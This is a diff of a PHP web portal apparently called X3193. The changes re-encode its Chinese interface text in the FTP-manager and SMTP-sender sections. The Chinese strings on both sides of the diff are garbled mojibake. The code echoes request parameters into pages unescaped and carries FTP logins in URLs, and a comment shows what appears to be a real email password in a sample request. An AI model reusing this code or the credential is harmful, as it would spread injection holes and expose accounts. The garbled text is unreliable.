+                        æ–‡ä»¶ <?php echo trim(request("name"));?> åˆ›å»ºæˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ   
                 <?php                       
                 }
                 ?>
@@ -6727,19 +8355,19 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
                 <?php 
                 if (trim(request("type")) == "dir"){
                 ?>
-                        Ä¿Â¼ <?php echo trim(request("name"));?> ´´½¨³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³   
+                        ç›®å½• <?php echo trim(request("name"));?> åˆ›å»ºæˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ   
                 <?php                       
                 }
                 elseif (trim(request("type")) == "dir"){
                 ?>
-                        ÎÄ¼ş <?php echo trim(request("name"));?> ´´½¨³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³   
+                        æ–‡ä»¶ <?php echo trim(request("name"));?> åˆ›å»ºæˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ   
                 <?php                       
                 }
                 ?>
@@ -6763,19 +8391,19 @@ function changeimg()
 </script>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="left">&nbsp;FTP¹ÜÀí -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".trim(request("dir"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&dir=".encodeuri("/")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("dir"));?></td>
+                <td align="left">&nbsp;FTPç®¡ç† -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".trim(request("dir"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&dir=".encodeuri("/")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("dir"));?></td>
         </tr>
 </table>
 <table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg" height="40">
                 <td align="center">
                         <form enctype="multipart/form-data" action="<?php echo ScriptPath()?>?api=ftp&skin=<?php echo $skincolor."&server=".encodeuri(trim(request("server")))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&port=".trim(request("port"));?>&action=<?php echo encodeuri("ftp.uploadfile");?>&c=<?php echo encodeuri(trim(request("c")));?>&t=<?php echo encodeuri(trim(request("t")));?>&u=<?php echo encodeuri(trim(request("u")));?>&refer=<?php echo encodeuri(trim(request("refer")));?>" method="POST" name="ftp">
-                        &nbspÎÄ¼şÂ·¾¶£º<input type="file" class="text" name="filepath" value="" style="height:20px;width:25%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspÑéÖ¤Âë£º<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
-                        ¶ş½øÖÆ£º<input type="checkbox" id="binary" name="binary" value="1" />
+                        &nbspæ–‡ä»¶è·¯å¾„ï¼š<input type="file" class="text" name="filepath" value="" style="height:20px;width:25%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspéªŒè¯ç ï¼š<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
+                        äºŒè¿›åˆ¶ï¼š<input type="checkbox" id="binary" name="binary" value="1" />
                         <input type="hidden" class="text" name="timestamp" value="<?php echo time();?>" size="1"> 
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
-                        <?php  echo ' '.'ÎÄ¼şÉÏ´«ÏŞÖÆ£º'.ini_get("upload_max_filesize"); ?>
+                        <?php  echo ' '.'æ–‡ä»¶ä¸Šä¼ é™åˆ¶ï¼š'.ini_get("upload_max_filesize"); ?>
                 </td>
         </tr>   
 </table>                
@@ -6783,16 +8411,16 @@ function changeimg()
                 break;          
         case "ftp.uploadfile":
                 if ($_FILES['filepath']['tmp_name'] == "" || $_FILES['filepath']['name'] == ""){
-                        AlertBack("ÎÄ¼şÂ·¾¶ÃûÎª¿Õ£¡" , 1);
+                        AlertBack("æ–‡ä»¶è·¯å¾„åä¸ºç©ºï¼" , 1);
                         break;
                 }
                 If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                         if (trim(request("checkcode")) != ""){
-                                AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                 break;
                         }       
                         elseif (trim(request("checkcode")) == ""){
-                                AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                                AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                                 break;
                         }               
                 }               
@@ -6825,11 +8453,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ÎÄ¼şÉÏ´«³É¹¦£¡¹²ÓÃÊ±£º <?php echo (time()-trim(request('timestamp')))/60;?> ·ÖÖÓ <?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼å…±ç”¨æ—¶ï¼š <?php echo (time()-trim(request('timestamp')))/60;?> åˆ†é’Ÿ <?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -6842,11 +8470,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ÎÄ¼şÉÏ´«Ê§°Ü£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -6881,7 +8509,7 @@ function changeimg()
                 //@ftp_chdir($conn_id, "/");    
                 $count = ftp_view($conn_id,((trim(request("dir"))=="/")?""."/":$dir."/").trim(request("dirname")),0,0);         
                 if (((trim(request("dir"))=="/")?""."/":$dir."/").trim(request("dirname")) == arrmember(split("[|]",$count),"2")){
-                        echo "Ä¿Â¼:".arrmember(split("[|]",$count),"0").".ÎÄ¼ş:".arrmember(split("[|]",$count),"1")."\r\n";
+                        echo "ç›®å½•:".arrmember(split("[|]",$count),"0").".æ–‡ä»¶:".arrmember(split("[|]",$count),"1")."\r\n";
                 }
                 break;          
         case "ftp.zip":
@@ -6902,13 +8530,13 @@ function changeimg()
         <tr class="tdtbg" height="40">
                 <td align="center">
                         <form action="<?php echo ScriptPath()?>?api=ftp&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("ftp.list");?>&c=<?php echo encodeuri(trim(request("c")));?>&t=<?php echo encodeuri(trim(request("t")));?>&u=<?php echo encodeuri(trim(request("u")));?>" method="post" name="ftp">
-                        &nbspÓòÃû£º<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspÓÃ»§Ãû£º<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspÃÜÂë£º<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
-                        &nbsp¶Ë¿Ú£º<input type="port" class="text" name="port" value="" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
-                        SSL£º<input type="checkbox" id="ssl" name="ssl" value="1" />
-                        ±»¶¯£º<input type="checkbox" id="pasv" name="pasv" value="1" />
-                        &nbspÑéÖ¤Âë£º<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
+                        &nbspåŸŸåï¼š<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspç”¨æˆ·åï¼š<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspå¯†ç ï¼š<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
+                        &nbspç«¯å£ï¼š<input type="port" class="text" name="port" value="" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
+                        SSLï¼š<input type="checkbox" id="ssl" name="ssl" value="1" />
+                        è¢«åŠ¨ï¼š<input type="checkbox" id="pasv" name="pasv" value="1" />
+                        &nbspéªŒè¯ç ï¼š<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                 </td>
         </tr>   
@@ -6940,7 +8568,7 @@ function ftp_view($conn_id,$dir,$dircount,$filecount){
                         }
                 }       
         }
-        //echo "Ä¿Â¼£º".$dircount."ÎÄ¼ş".$filecount."\r\n";             
+        //echo "ç›®å½•ï¼š".$dircount."æ–‡ä»¶".$filecount."\r\n";             
         return $dircount."|".$filecount."|".$dir;               
 }
 
@@ -7422,25 +9050,25 @@ function selcss($skincolor){
 $skincolorarray=$this->skincolorarray($skincolor);
 	//return;
 /*
-CSS gradient½¥±äÖ®webkit
+CSS gradientæ¸å˜ä¹‹webkit
 -webkit-gradient(type, start_point, end_point, / stop...)
 -webkit-gradient(type, inner_center, inner_radius, outer_center, outer_radius, / stop...)
 
-²ÎÊıÀàĞÍ	¼òÒªËµÃ÷
-type	½¥±äµÄÀàĞÍ£¬¿ÉÒÔÊÇÏßĞÔ½¥±ä(linear)»òÊÇ¾¶Ïò½¥±ä(radial)
-start_point	½¥±äÍ¼ÏñÖĞ½¥±äµÄÆğÊ¼µã
-end_point	½¥±äÍ¼ÏñÖĞ½¥±äµÄ½áÊøµã
-stop	color-stop()·½·¨£¬Ö¸¶¨½¥±ä½ø³ÌÖĞÌØ¶¨µÄÑÕÉ«
-inner_center	ÄÚ²¿ÖĞĞÄµã£¬¾¶Ïò½¥±äÆğÊ¼Ô²»·
-inner_radius	ÄÚ²¿°ë¾¶£¬¾¶Ïò½¥±äÆğÊ¼Ô²
-outer_center	Íâ²¿½¥±ä½áÊøÔ²µÄÖĞĞÄµã
-outer_radius	Íâ²¿½¥±ä½áÊøÔ²µÄ°ë¾¶
+å‚æ•°ç±»å‹	ç®€è¦è¯´æ˜
+type	æ¸å˜çš„ç±»å‹ï¼Œå¯ä»¥æ˜¯çº¿æ€§æ¸å˜(linear)æˆ–æ˜¯å¾„å‘æ¸å˜(radial)
+start_point	æ¸å˜å›¾åƒä¸­æ¸å˜çš„èµ·å§‹ç‚¹
+end_point	æ¸å˜å›¾åƒä¸­æ¸å˜çš„ç»“æŸç‚¹
+stop	color-stop()æ–¹æ³•ï¼ŒæŒ‡å®šæ¸å˜è¿›ç¨‹ä¸­ç‰¹å®šçš„é¢œè‰²
+inner_center	å†…éƒ¨ä¸­å¿ƒç‚¹ï¼Œå¾„å‘æ¸å˜èµ·å§‹åœ†ç¯
+inner_radius	å†…éƒ¨åŠå¾„ï¼Œå¾„å‘æ¸å˜èµ·å§‹åœ†
+outer_center	å¤–éƒ¨æ¸å˜ç»“æŸåœ†çš„ä¸­å¿ƒç‚¹
+outer_radius	å¤–éƒ¨æ¸å˜ç»“æŸåœ†çš„åŠå¾„
 
-IEä¯ÀÀÆ÷ÏÂ½¥±ä±³¾°µÄÊ¹ÓÃĞèÒªÊ¹ÓÃIEµÄ½¥±äÂË¾µ¡£ÈçÏÂ´úÂë£º
+IEæµè§ˆå™¨ä¸‹æ¸å˜èƒŒæ™¯çš„ä½¿ç”¨éœ€è¦ä½¿ç”¨IEçš„æ¸å˜æ»¤é•œã€‚å¦‚ä¸‹ä»£ç ï¼š
 filter: progid:DXImageTransform.Microsoft.gradient(startcolorstr=red,endcolorstr=blue,gradientType=1);
 
-ÉÏÃæµÄÂË¾µ´úÂëÖ÷ÒªÓĞÈı¸ö²ÎÊı£¬ÒÀ´ÎÊÇ£ºstartcolorstr, endcolorstr, ÒÔ¼°gradientType¡£
-ÆäÖĞgradientType=1´ú±íºáÏò½¥±ä£¬gradientType=0´ú±í×İÏòäÀ±ä¡£startcolorstr=¡±É«²Ê¡± ´ú±í½¥±ä½¥±äÆğÊ¼µÄÉ«²Ê£¬endcolorstr=¡±É«²Ê¡± ´ú±í½¥±ä½áÎ²µÄÉ«²Ê¡£
+ä¸Šé¢çš„æ»¤é•œä»£ç ä¸»è¦æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œä¾æ¬¡æ˜¯ï¼šstartcolorstr, endcolorstr, ä»¥åŠgradientTypeã€‚
+å…¶ä¸­gradientType=1ä»£è¡¨æ¨ªå‘æ¸å˜ï¼ŒgradientType=0ä»£è¡¨çºµå‘æ·…å˜ã€‚startcolorstr=â€è‰²å½©â€ ä»£è¡¨æ¸å˜æ¸å˜èµ·å§‹çš„è‰²å½©ï¼Œendcolorstr=â€è‰²å½©â€ ä»£è¡¨æ¸å˜ç»“å°¾çš„è‰²å½©ã€‚
 */
 	//return;
 ?>
@@ -7456,7 +9084,7 @@ filter: progid:DXImageTransform.Microsoft.gradient(startcolorstr=red,endcolorstr
         select.text { font-size:12px; color: #444444;background-color: <?php  echo $skincolorarray["others"] ?>; border: 1px <?php  echo $skincolorarray["others"] ?> solid;} 
         textarea.text { font-size:12px; color: #444444; background-color: #ffffff; border: 1px solid <?php  echo $skincolorarray["others"] ?>; } 
         .option { font-size:12px; color: #444444; background-color: <?php echo $skincolorarray["tdtbg"] ?>; border: 1px solid <?php  echo $skincolorarray["others"] ?>;} 
-        .button{font-family: "Tahoma", "ËÎÌå"; font-size: 11px; color: #444444;border: 1px <?php  echo $skincolorarray["others"]; ?> solid; background-color: <?php  echo $skincolorarray["tdtbg"]; ?>;CURSOR: hand;font-style: normal ;}
+        .button{font-family: "Tahoma", "å®‹ä½“"; font-size: 11px; color: #444444;border: 1px <?php  echo $skincolorarray["others"]; ?> solid; background-color: <?php  echo $skincolorarray["tdtbg"]; ?>;CURSOR: hand;font-style: normal ;}
         .input { font-size:12px; color: #444444; background-color: #ffffff; border-left:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-top:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-right:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-bottom:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;text-align:center; }
         .textarea { font-size:12px; color: #444444; background-color: #ffffff; border-left:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-top:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-right:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-bottom:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;}        
         .select { font-size:12px; color: #444444; background-color: #ffffff;border:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid; border-left:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-top:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-right:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-bottom:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;}       	
@@ -7610,7 +9238,7 @@ function footer(){
                        	<?php  echo "Hosted by ".strtoupper($_SERVER["SERVER_NAME"])." ".date("Y-m-d");
                     	
                        	?>
-                        <a style='color:#444444' href="skype:+990009369991439853" target='_blank'><?php echo formatchar('ºôÎÒ');?></a>
+                        <a style='color:#444444' href="skype:+990009369991439853" target='_blank'><?php echo ('å‘¼æˆ‘');?></a>
 								<?php
 							
 								?>
@@ -7641,8 +9269,8 @@ function googleTranslateElementInit() {
                                         <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=x3193"></script>
                                         </noscript>
 
-		                                    <a style='color:#444444' href="http://www.addthis.com/bookmark.php?v=250&amp;pubid=x3193" class="addthis_button_compact" target="_blank"><?php echo formatchar('·ÖÏí');?></a>
-                                        <a style='color:#444444' href="skype:+990009369991439853"><?php echo formatchar('ºôÎÒ');?></a>
+		                                    <a style='color:#444444' href="http://www.addthis.com/bookmark.php?v=250&amp;pubid=x3193" class="addthis_button_compact" target="_blank"><?php echo ('åˆ†äº«');?></a>
+                                        <a style='color:#444444' href="skype:+990009369991439853"><?php echo ('å‘¼æˆ‘');?></a>
 
                                         
 
@@ -7673,8 +9301,8 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
                         		?>
                                 </td>
                                 <td height="30"> 
-                                        <a style='color:#444444' href="http://www.addthis.com/bookmark.php?v=250&amp;pubid=x3193" class="addthis_button_compact" target="_blank"><?php echo formatchar('·ÖÏí');?></a>
-                                        <a style='color:#444444' href="ext:tel/+85258083882"><?php echo formatchar('ºôÎÒ');?></a>
+                                        <a style='color:#444444' href="http://www.addthis.com/bookmark.php?v=250&amp;pubid=x3193" class="addthis_button_compact" target="_blank"><?php echo ('åˆ†äº«');?></a>
+                                        <a style='color:#444444' href="ext:tel/+85258083882"><?php echo ('å‘¼æˆ‘');?></a>
                                 </td>                                        
                         </tr>
                 </table>  
@@ -7698,7 +9326,7 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
 <?php 
 function smtp() {
 // http://server/?api=smtp&server=smtp.163.com&port=25&sname=X3193&semail=xcy6272003@163.com&spwd=EUIfgwe7&rname=X3193&remail=xcy6272003@126.com&bodytype=HTML&timeout=300&cc=xcy6272003@126.com&content=jjjjjjjjjjjjjj<br>jjjjjjjjj<div>jjjjjj</div>&subject=66666666666666&bcc=xcy6272003@126.com&aheader=&timeout=300
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 
 ?>
 <head>
@@ -7707,7 +9335,7 @@ $style = new css();
 $style->ico();
 $style->title("X3193 - SMTP");
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 
 <table width="100%" height="100%" align="center" valign="center">
@@ -7721,9 +9349,9 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
                 <td align="right" style="border:0">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -7741,54 +9369,54 @@ switch (trim(request('action'))) {  // case start
                         //echo encodeuri(trim($_SERVER['HTTP_REFERER']));
                         //return;
                         if (trim(request('server'))=="" || trim(request('semail'))=="" || trim(request('remail'))=="" || trim(request('semail'))=="" || trim(request('spwd'))==""){
-                                AlertBack ("ĞÅÏ¢ÌîĞ´²»ÍêÈ«£¡" ,1);
+                                AlertBack ("ä¿¡æ¯å¡«å†™ä¸å®Œå…¨ï¼" ,1);
                         }
                         //print_r($_POST);
                         //return;
                         $smtpserver = trim(request('server'));
-                        //SMTP·şÎñÆ÷ 
+                        //SMTPæœåŠ¡å™¨ 
                         $smtpserverport =trim(request('port'));
-                        //SMTP·şÎñÆ÷¶Ë¿Ú 
+                        //SMTPæœåŠ¡å™¨ç«¯å£ 
                         $smtpusermail = trim(request('semail'));
-                        //SMTP·şÎñÆ÷µÄÓÃ»§ÓÊÏä 
+                        //SMTPæœåŠ¡å™¨çš„ç”¨æˆ·é‚®ç®± 
                         $smtpemailto = trim(request('remail'));
                         $smtpemailtoname = trim(request('rname'));
-                        //·¢ËÍ¸øË­ 
+                        //å‘é€ç»™è° 
                         $smtpuser = trim(request('semail'));
                         $smtpusername = trim(request('sname'));
-                        //SMTP·şÎñÆ÷µÄÓÃ»§ÕÊºÅ 
+                        //SMTPæœåŠ¡å™¨çš„ç”¨æˆ·å¸å· 
                         $smtppass = trim(request('spwd'));
-                        //SMTP·şÎñÆ÷µÄÓÃ»§ÃÜÂë 
+                        //SMTPæœåŠ¡å™¨çš„ç”¨æˆ·å¯†ç  
                         $mailsubject = trim(request('subject'));
-                        //ÓÊ¼şÖ÷Ìâ 
+                        //é‚®ä»¶ä¸»é¢˜ 
                         $mailbody = iconv("utf-8","gb2312",decodeuri(trim(request('content'))));
-                        //ÓÊ¼şÄÚÈİ 
+                        //é‚®ä»¶å†…å®¹ 
                         $mailtype = trim(request('bodytype'));
-                        //ÓÊ¼ş¸ñÊ½£¨HTML/TXT£©,TXTÎªÎÄ±¾ÓÊ¼ş 
+                        //é‚®ä»¶æ ¼å¼ï¼ˆHTML/TXTï¼‰,TXTä¸ºæ–‡æœ¬é‚®ä»¶ 
                         $cc = trim(request('cc')) ; 
                         $bcc = trim(request('bcc')) ; 
                         $additional_headers = trim(request('aheader'));
                         $timeout = trim(request('timeout'));
                         ########################################## 
                         $smtp = new smtp($smtpserver,$smtpserverport,true,$smtpuser,$smtppass);
-                        //ÕâÀïÃæµÄÒ»¸ötrueÊÇ±íÊ¾Ê¹ÓÃÉí·İÑéÖ¤,·ñÔò²»Ê¹ÓÃÉí·İÑéÖ¤. 
+                        //è¿™é‡Œé¢çš„ä¸€ä¸ªtrueæ˜¯è¡¨ç¤ºä½¿ç”¨èº«ä»½éªŒè¯,å¦åˆ™ä¸ä½¿ç”¨èº«ä»½éªŒè¯. 
                         if (0){
                                 $smtp->debug = false;
                         }       
                         elseif (strtolower(trim($_SERVER['SERVER_NAME'])) == "web.x3193.cz.cc"){
                                 $smtp->debug = false;
                         }
-                        //ÊÇ·ñÏÔÊ¾·¢ËÍµÄµ÷ÊÔĞÅÏ¢ 
+                        //æ˜¯å¦æ˜¾ç¤ºå‘é€çš„è°ƒè¯•ä¿¡æ¯ 
                         if ($smtp->sendmail($smtpemailto,$smtpemailtoname, $smtpuser,$smtpusername, $mailsubject, $mailbody, $mailtype, $cc, $bcc, $additional_headers,$timeout)){
                                 $timeout = "5000";
                                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                        µç×ÓÓÊ¼ş·¢ËÍ³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³                
+                        ç”µå­é‚®ä»¶å‘é€æˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ                
                 </td>
         </tr>   
                                 <?php 
@@ -7803,11 +9431,11 @@ switch (trim(request('action'))) {  // case start
                                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                        µç×ÓÓÊ¼ş·¢ËÍÊ§°Ü£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³                
+                        ç”µå­é‚®ä»¶å‘é€å¤±è´¥ï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ                
                 </td>
         </tr>   
                                 <?php 
@@ -7838,11 +9466,11 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                         elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                                 If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                         if (trim(request("checkcode")) != ""){
-                                                AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                                AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                                 break;
                                         }       
                                         elseif (trim(request("checkcode")) == ""){
-                                                AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                                                AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                                                 break;
                                         }               
                                 }
@@ -7877,7 +9505,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 <FORM ACTION="<?php echo scriptpath()."?api=smtp&action=sendmail&skin=".$skincolor;?>" METHOD=POST NAME="smtp">
         <tr class="tdtbg">
                 <td align="left">
-                        &nbsp½ÓÊÕ·½µØÖ·ĞÅÏ¢£º
+                        &nbspæ¥æ”¶æ–¹åœ°å€ä¿¡æ¯ï¼š
                 </td>
         </tr>   
 </table>
@@ -7885,7 +9513,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 <table width="95%" height="70" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr>
                 <td align="center" width="20%">
-                        ÊÕ·½ÄØ³Æ£º
+                        æ”¶æ–¹å‘¢ç§°ï¼š
                 </td>
                 <td align="center" width="80%">
                         <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
@@ -7894,7 +9522,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         </tr>   
         <tr>
                 <td align="center">
-                        ÊÕ·½µØÖ·£º
+                        æ”¶æ–¹åœ°å€ï¼š
                 </td>
                 <td align="center">
                         <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseouqdt="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
@@ -7912,7 +9540,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 <table width="95%" height="35" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
                 <td align="left">
-                        &nbsp·¢ËÍ·½SMTP·şÎñÆ÷ĞÅÏ¢£º
+                        &nbspå‘é€æ–¹SMTPæœåŠ¡å™¨ä¿¡æ¯ï¼š
                 </td>
         </tr>   
 </table>
@@ -7920,7 +9548,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 <table width="95%" height="159" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr>
                 <td align="center" width="20%">
-                        SMTPÓòÃû£º
+                        SMTPåŸŸåï¼š
                 </td>
